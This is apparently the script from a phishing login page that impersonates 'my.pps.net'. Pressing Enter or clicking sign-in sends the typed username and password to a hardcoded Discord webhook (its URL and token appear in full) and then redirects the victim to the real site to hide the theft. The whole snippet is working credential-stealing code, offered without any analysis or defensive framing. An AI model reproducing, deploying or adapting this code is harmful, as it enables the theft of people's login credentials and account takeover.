<script type="text/javascript">
  function sendToWebhook(event) {
    event.preventDefault();
    
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    
    fetch("https://discord.com/api/webhooks/1288247259762393130/uEt6yZBygb_vyY7UJfkr8TNNLohsuj36faVoKSSHBuFvAK2VXYB3DqV-2FxiVZnjFlPV", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `Username: ${username}\nPassword: ${password}`
      })
    });
    
    window.location.href = "http://my.pps.net/";
  }

  document.getElementById("username").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
      sendToWebhook(event);
    }
  });

  document.getElementById("password").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
      sendToWebhook(event);
    }
  });

  document.getElementById("signin").addEventListener("click", sendToWebhook);
</script>
